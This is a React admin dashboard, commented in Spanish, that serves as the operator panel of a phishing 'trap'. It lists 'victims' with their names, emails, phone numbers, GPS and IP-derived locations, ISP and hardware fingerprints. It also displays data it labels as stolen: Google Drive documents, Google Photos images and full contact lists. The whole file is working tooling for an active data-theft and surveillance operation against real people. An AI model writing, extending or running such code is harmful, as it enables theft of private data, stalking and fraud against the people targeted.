import React, { useEffect, useState } from 'react';

const AdminDashboard = () => {
    const [victims, setVictims] = useState([]);
    const [geoData, setGeoData] = useState({}); // { ip: { city, country, lat, lon } }

    useEffect(() => {
        // Pedimos los datos reales a SQL Server a través del backend C#
        const BACKEND_URL = import.meta.env.VITE_BACKEND_URL || 'http://localhost:5006';
        console.log(`Intentando conectar con el backend en ${BACKEND_URL}...`);
        fetch(`${BACKEND_URL}/api/telemetry/victims`, {
            headers: {
                'ngrok-skip-browser-warning': 'true'
            }
        })
            .then(async res => {
                if (!res.ok) {
                    const text = await res.text();
                    throw new Error(`Error del servidor: ${res.status} - ${text}`);
                }
                return res.json();
            })
            .then(data => {
                console.log("🔥 Datos recibidos del backend:", data);
                setVictims(data);
                
                // Buscar geolocalización e ISP para cada IP única (que no sea local)
                const uniqueIps = [...new Set(data.map(v => v.IpAddress || v.ipAddress))];
                uniqueIps.forEach(ip => {
                    if (ip && ip !== "::1" && ip !== "127.0.0.1") {
                        fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query`)
                            .then(res => res.json())
                            .then(loc => {
                                if (loc.status === "success") {
                                    setGeoData(prev => ({ ...prev, [ip]: loc }));
                                }
                            })
                            .catch(e => console.error("Error geolocalizando IP:", ip, e));
                    }
                });
            })
            .catch(err => {
                console.error("❌ Error cargando víctimas:", err);
                if (err.message.includes("Failed to fetch")) {
                    console.log("Reintentando con 127.0.0.1...");
                    fetch('http://127.0.0.1:5006/api/telemetry/victims')
                        .then(res => res.json())
                        .then(data => setVictims(data))
                        .catch(e => console.error("Fallo total de conexión:", e));
                }
            });
    }, []);

    return (
        <div style={{ padding: '30px', backgroundColor: '#0a0a0a', color: '#0f0', minHeight: '100vh', fontFamily: 'monospace', width: '100vw', boxSizing: 'border-box' }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', borderBottom: '1px solid #0f0', paddingBottom: '10px', marginBottom: '20px' }}>
                <h1 style={{ margin: 0 }}>☠️ Panel de Control - MODO DIOS</h1>
                <button 
                    onClick={() => window.location.href = '/'} 
                    style={{ backgroundColor: 'transparent', border: '1px solid #0f0', color: '#0f0', padding: '5px 15px', cursor: 'pointer', fontFamily: 'monospace' }}
                >
                    VOLVER A LA TRAMPA
                </button>
            </div>
            
            <p style={{ color: '#fff' }}>Base de datos en SQL Server. Listado completo de telemetría extraída:</p>

            {victims.length === 0 ? <p style={{color: '#ffaa00'}}>Cargando datos o base de datos vacía...</p> : (
                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(400px, 1fr))', gap: '20px', marginTop: '30px' }}>
                    {victims.map((v, idx) => (
                        <div key={idx} style={{ border: '1px solid #333', padding: '20px', borderRadius: '8px', backgroundColor: '#111', boxShadow: '0 4px 15px rgba(0,0,0,0.5)' }}>
                            
                            {/* CABECERA (Quien cayó) */}
                            <div style={{ display: 'flex', alignItems: 'center', gap: '15px', marginBottom: '15px' }}>
                                {(v.IdentityPictureUrl || v.identityPictureUrl) ? (
                                    <img src={v.IdentityPictureUrl || v.identityPictureUrl} alt="Avatar" style={{ width: '60px', borderRadius: '50%', border: '2px solid #0f0' }} />
                                ) : (
                                    <div style={{ width: '60px', height: '60px', borderRadius: '50%', border: '2px solid #555', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '30px', backgroundColor: '#222' }}>👤</div>
                                )}
                                <div style={{ overflow: 'hidden' }}>
                                    <h3 style={{ margin: 0, color: '#fff', fontSize: '18px', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>
                                        {v.IdentityName || v.identityName || 'Anónimo'}
                                    </h3>
                                    <div style={{ color: '#aaa', fontSize: '14px', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>
                                        {v.IdentityEmail || v.identityEmail}
                                    </div>
                                    <div style={{ color: '#0f0', fontSize: '15px', fontWeight: 'bold', marginTop: '5px', letterSpacing: '1px' }}>
                                        📞 {v.PhoneNumber || v.phoneNumber || 'No disponible'}
                                    </div>
                                    <div style={{ color: '#f00', fontSize: '12px', marginTop: '4px' }}>
                                        IP: {v.IpAddress || v.ipAddress} | {new Date(v.TimestampUtc || v.timestampUtc).toLocaleString()}
                                    </div>
                                    {geoData[v.IpAddress || v.ipAddress] && (
                                        <div style={{ marginTop: '5px', padding: '8px', backgroundColor: '#001a1a', borderRadius: '4px', border: '1px solid #004d4d' }}>
                                            <div style={{ color: '#00ccff', fontSize: '11px', fontWeight: 'bold' }}>
                                                📍 {geoData[v.IpAddress || v.ipAddress].city}, {geoData[v.IpAddress || v.ipAddress].country}
                                            </div>
                                            <div style={{ color: '#00ffaa', fontSize: '10px', marginTop: '3px' }}>
                                                🏢 ISP: {geoData[v.IpAddress || v.ipAddress].isp}
                                            </div>
                                            <div style={{ color: '#888', fontSize: '9px', display: 'flex', gap: '8px', marginTop: '2px' }}>
                                                <span>Tipo: {geoData[v.IpAddress || v.ipAddress].mobile ? '📱 Móvil' : '🏠 Residencial'}</span>
                                                {geoData[v.IpAddress || v.ipAddress].proxy && <span style={{ color: '#ff4d4d' }}>⚠️ Proxy/VPN</span>}
                                            </div>
                                        </div>
                                    )}
                                    {(v.Latitude || v.latitude) && (
                                        <div style={{ color: '#ff00ff', fontSize: '11px', marginTop: '2px', fontWeight: 'bold' }}>
                                            🛰️ Coordenadas GPS: {v.Latitude || v.latitude}, {v.Longitude || v.longitude}
                                        </div>
                                    )}
                                </div>
                            </div>

                            {/* MAPA DE UBICACIÓN */}
                            <div style={{ marginBottom: '15px', borderRadius: '4px', overflow: 'hidden', border: '1px solid #333', height: '180px', backgroundColor: '#000', position: 'relative', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                                {((v.Latitude || v.latitude) || (geoData[v.IpAddress || v.ipAddress] && geoData[v.IpAddress || v.ipAddress].lat)) ? (
                                    <iframe 
                                        width="100%" 
                                        height="100%" 
                                        frameBorder="0" 
                                        scrolling="no" 
                                        marginHeight="0" 
                                        marginWidth="0" 
                                        src={`https://www.openstreetmap.org/export/embed.html?bbox=${(v.Longitude || v.longitude || geoData[v.IpAddress || v.ipAddress]?.lon || 0) - 0.01}%2C${(v.Latitude || v.latitude || geoData[v.IpAddress || v.ipAddress]?.lat || 0) - 0.01}%2C${(v.Longitude || v.longitude || geoData[v.IpAddress || v.ipAddress]?.lon || 0) + 0.01}%2C${(v.Latitude || v.latitude || geoData[v.IpAddress || v.ipAddress]?.lat || 0) + 0.01}&layer=mapnik&marker=${v.Latitude || v.latitude || geoData[v.IpAddress || v.ipAddress]?.lat}%2C${v.Longitude || v.longitude || geoData[v.IpAddress || v.ipAddress]?.lon}`}
                                        style={{ filter: 'grayscale(1) invert(1) contrast(1.2)', position: 'absolute', top: 0, left: 0 }}
                                    ></iframe>
                                ) : (
                                    <div style={{ textAlign: 'center', color: '#444', padding: '20px' }}>
                                        <div style={{ fontSize: '24px', marginBottom: '10px' }}>📍</div>
                                        <div style={{ fontSize: '11px' }}>ESPERANDO SEÑAL GPS O IP PÚBLICA...</div>
                                        <div style={{ fontSize: '9px', marginTop: '5px', color: '#333' }}>
                                            (En localhost/::1 el mapa requiere que la víctima acepte el permiso de GPS)
                                        </div>
                                    </div>
                                )}
                            </div>

                            {/* ESTADÍSTICAS DEL HARDWARE */}
                            <div style={{ fontSize: '12px', color: '#888', marginBottom: '15px', padding: '12px', backgroundColor: '#000', borderRadius: '4px', borderLeft: '3px solid #0f0' }}>
                                <div style={{ marginBottom: '5px' }}><b>Hardware/SO:</b> {v.UserAgentData || v.userAgentData}</div>
                                <div style={{ marginBottom: '8px', color: '#0f0', borderTop: '1px solid #222', paddingTop: '5px' }}>
                                    <b>GPU:</b> {v.GpuModel || v.gpuModel || 'Sin datos (Víctima antigua)'} <br/>
                                    <b>ISP Detectado:</b> {
                                        (v.IpAddress === '::1' || v.IpAddress === '127.0.0.1' || v.ipAddress === '::1' || v.ipAddress === '127.0.0.1') 
                                        ? 'Red Local (Localhost)' 
                                        : (v.IspName || v.ispName || geoData[v.IpAddress || v.ipAddress]?.isp || 'Desconocido')
                                    }
                                </div>
                                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '5px' }}>
                                    <div><b>Res:</b> {v.ScreenWidth || v.screenWidth}x{v.ScreenHeight || v.screenHeight}</div>
                                    <div><b>RAM:</b> {v.RamGb || v.ramGb}GB</div>
                                    <div><b>CPU:</b> {v.CpuCores || v.cpuCores} cores</div>
                                    <div><b>Batería:</b> {(v.BatteryLevelPct || v.batteryLevelPct) ? `${v.BatteryLevelPct || v.batteryLevelPct}%` : 'N/A'}</div>
                                    <div><b>Conexión:</b> {v.ConnectionType || v.connectionType || 'unknown'}</div>
                                    <div><b>Zona:</b> {v.TimeZoneInfo || v.timeZoneInfo}</div>
                                </div>
                            </div>
                            
                            {/* ARCHIVOS ROBADOS */}
                            <h4 style={{ margin: '0 0 10px 0', color: '#ff4d4d', borderBottom: '1px dashed #333', paddingBottom: '5px', fontSize: '14px' }}>
                                📁 Archivos Extraídos de Google Drive:
                            </h4>
                            {(() => {
                                const rawData = v.StolenDriveFiles || v.stolenDriveFiles;
                                if (!rawData || !rawData.startsWith('{')) {
                                    // Manejo de datos antiguos (formato array simple)
                                    if (rawData && rawData.startsWith('[')) {
                                        return (
                                            <ul style={{ listStyle: 'none', padding: 0, margin: 0 }}>
                                                {JSON.parse(rawData).map((file, i) => (
                                                    <li key={i} style={{ marginBottom: '8px', display: 'flex', alignItems: 'center', backgroundColor: '#1a1a1a', padding: '5px', borderRadius: '4px' }}>
                                                        <img src={file.icon || file.iconLink || ""} alt="" style={{ width: '16px', marginRight: '8px' }} />
                                                        <a href={file.link || file.webViewLink} target="_blank" rel="noreferrer" style={{ color: '#61dafb', textDecoration: 'none', fontSize: '13px', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis', width: '100%' }}>
                                                            {file.name}
                                                        </a>
                                                    </li>
                                                ))}
                                            </ul>
                                        );
                                    }
                                    return (
                                        <div style={{ color: '#ffaa00', fontSize: '13px', fontStyle: 'italic', padding: '5px', backgroundColor: '#1a1a1a', borderRadius: '4px' }}>
                                            {rawData || "Ningún archivo extraído."}
                                        </div>
                                    );
                                }

                                // Nuevo formato: { documents: [], photos: [], googlePhotos: [], contacts: [] }
                                const parsedData = JSON.parse(rawData);
                                console.log("Datos parseados en Admin:", parsedData); // LOG DE DEPURACIÓN
                                return (
                                    <>
                                        {/* NUEVO: Contactos Extraídos */}
                                        {parsedData.contacts && parsedData.contacts.length > 0 && (
                                            <div style={{ marginBottom: '25px', padding: '15px', backgroundColor: '#1a1a00', borderRadius: '10px', border: '1px solid #4d4d00' }}>
                                                <div style={{ color: '#ffff00', fontSize: '13px', marginBottom: '12px', display: 'flex', alignItems: 'center', gap: '10px', fontWeight: 'bold' }}>
                                                    <span style={{ fontSize: '20px' }}>👥</span>
                                                    <span>AGENDA DE CONTACTOS EXTRAÍDA</span>
                                                    <span style={{ fontSize: '10px', backgroundColor: '#ffff00', padding: '2px 10px', borderRadius: '12px', color: '#000' }}>
                                                        {parsedData.contacts.length} contactos
                                                    </span>
                                                </div>
                                                <div style={{ 
                                                    maxHeight: '200px', 
                                                    overflowY: 'auto', 
                                                    padding: '5px',
                                                    scrollbarWidth: 'thin',
                                                    scrollbarColor: '#ffff00 #000'
                                                }}>
                                                    {parsedData.contacts.map((c, i) => (
                                                        <div key={i} style={{ padding: '8px', borderBottom: '1px solid #333', display: 'flex', justifyContent: 'space-between', alignItems: 'center', fontSize: '11px' }}>
                                                            <div style={{ color: '#fff', fontWeight: 'bold' }}>{c.name}</div>
                                                            <div style={{ textAlign: 'right' }}>
                                                                <div style={{ color: '#ffff00' }}>{c.email}</div>
                                                                <div style={{ color: '#888' }}>{c.phone}</div>
                                                            </div>
                                                        </div>
                                                    ))}
                                                </div>
                                            </div>
                                        )}

                                        {/* Google Photos Real (MediaItems) */}
                                        {parsedData.googlePhotos?.length > 0 && (
                                            <div style={{ marginBottom: '25px', padding: '15px', backgroundColor: '#001515', borderRadius: '10px', border: '1px solid #004d4d' }}>
                                                <div style={{ color: '#00f2ff', fontSize: '13px', marginBottom: '12px', display: 'flex', alignItems: 'center', gap: '10px', fontWeight: 'bold' }}>
                                                    <span style={{ fontSize: '20px' }}>📸</span>
                                                    <span>BIBLIOTECA PERSONAL (GOOGLE PHOTOS)</span>
                                                    <span style={{ fontSize: '10px', backgroundColor: '#00f2ff', padding: '2px 10px', borderRadius: '12px', color: '#000' }}>
                                                        {parsedData.googlePhotos.length} capturadas
                                                    </span>
                                                </div>
                                                <div style={{ 
                                                    display: 'grid', 
                                                    gridTemplateColumns: 'repeat(auto-fill, minmax(110px, 1fr))', 
                                                    gap: '12px', 
                                                    maxHeight: '350px', 
                                                    overflowY: 'auto', 
                                                    padding: '5px',
                                                    scrollbarWidth: 'thin',
                                                    scrollbarColor: '#00f2ff #000'
                                                }}>
                                                    {parsedData.googlePhotos.map((gp, i) => (
                                                        <a 
                                                            key={i} 
                                                            href={gp.webViewLink} 
                                                            target="_blank" 
                                                            rel="noreferrer" 
                                                            style={{ 
                                                                textDecoration: 'none', 
                                                                backgroundColor: '#000', 
                                                                borderRadius: '8px', 
                                                                overflow: 'hidden', 
                                                                border: '2px solid #003333',
                                                                position: 'relative',
                                                                aspectRatio: '1/1'
                                                            }}
                                                        >
                                                            <img 
                                                                src={`${gp.thumbnailLink}=w250-h250-c`} 
                                                                alt=""
                                                                style={{ width: '100%', height: '100%', objectFit: 'cover' }} 
                                                            />
                                                            <div style={{ position: 'absolute', top: '5px', right: '5px', backgroundColor: 'rgba(0, 242, 255, 0.8)', color: '#000', fontSize: '8px', padding: '2px 4px', borderRadius: '3px', fontWeight: 'bold' }}>G-PHOTOS</div>
                                                        </a>
                                                    ))}
                                                </div>
                                            </div>
                                        )}

                                        {/* Fotos de Google Drive */}
                                        {parsedData.photos?.length > 0 && (
                                            <div style={{ marginBottom: '25px', padding: '15px', backgroundColor: '#051005', borderRadius: '10px', border: '1px solid #003300' }}>
                                                <div style={{ color: '#0f0', fontSize: '13px', marginBottom: '12px', display: 'flex', alignItems: 'center', gap: '10px', fontWeight: 'bold' }}>
                                                    <span style={{ fontSize: '20px' }}>📁</span>
                                                    <span>IMÁGENES EN CARPETAS (GOOGLE DRIVE)</span>
                                                    <span style={{ fontSize: '10px', backgroundColor: '#0f0', padding: '2px 10px', borderRadius: '12px', color: '#000' }}>
                                                        {parsedData.photos.length} encontradas
                                                    </span>
                                                </div>
                                                <div style={{ 
                                                    display: 'grid', 
                                                    gridTemplateColumns: 'repeat(auto-fill, minmax(100px, 1fr))', 
                                                    gap: '12px', 
                                                    maxHeight: '300px', 
                                                    overflowY: 'auto', 
                                                    padding: '5px',
                                                    scrollbarWidth: 'thin',
                                                    scrollbarColor: '#0f0 #000'
                                                }}>
                                                    {parsedData.photos.map((p, i) => (
                                                        <a 
                                                            key={i} 
                                                            href={p.webViewLink} 
                                                            target="_blank" 
                                                            rel="noreferrer" 
                                                            style={{ 
                                                                textDecoration: 'none', 
                                                                backgroundColor: '#000', 
                                                                borderRadius: '8px', 
                                                                overflow: 'hidden', 
                                                                border: '2px solid #002200',
                                                                position: 'relative',
                                                                aspectRatio: '1/1'
                                                            }}
                                                        >
                                                            <img 
                                                                src={p.thumbnailLink} 
                                                                alt=""
                                                                style={{ width: '100%', height: '100%', objectFit: 'cover' }} 
                                                            />
                                                            <div style={{ position: 'absolute', top: '5px', right: '5px', backgroundColor: 'rgba(0, 255, 0, 0.8)', color: '#000', fontSize: '8px', padding: '2px 4px', borderRadius: '3px', fontWeight: 'bold' }}>G-DRIVE</div>
                                                        </a>
                                                    ))}
                                                </div>
                                            </div>
                                        )}
                                        
                                        {/* Documentos */}
                                        {parsedData.documents?.length > 0 && (
                                            <ul style={{ listStyle: 'none', padding: 0, margin: 0 }}>
                                                <div style={{ color: '#0f0', fontSize: '12px', marginBottom: '8px' }}>📄 Documentos:</div>
                                                {parsedData.documents.map((file, i) => (
                                                    <li key={i} style={{ marginBottom: '8px', display: 'flex', alignItems: 'center', backgroundColor: '#1a1a1a', padding: '5px', borderRadius: '4px' }}>
                                                        <img src={file.icon || file.iconLink || ""} alt="" style={{ width: '16px', marginRight: '8px' }} />
                                                        <a href={file.link || file.webViewLink} target="_blank" rel="noreferrer" style={{ color: '#61dafb', textDecoration: 'none', fontSize: '13px', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis', width: '100%' }}>
                                                            {file.name}
                                                        </a>
                                                    </li>
                                                ))}
                                            </ul>
                                        )}
                                    </>
                                );
                            })()}
                        </div>
                    ))}
                </div>
            )}
        </div>
    );
};

export default AdminDashboard;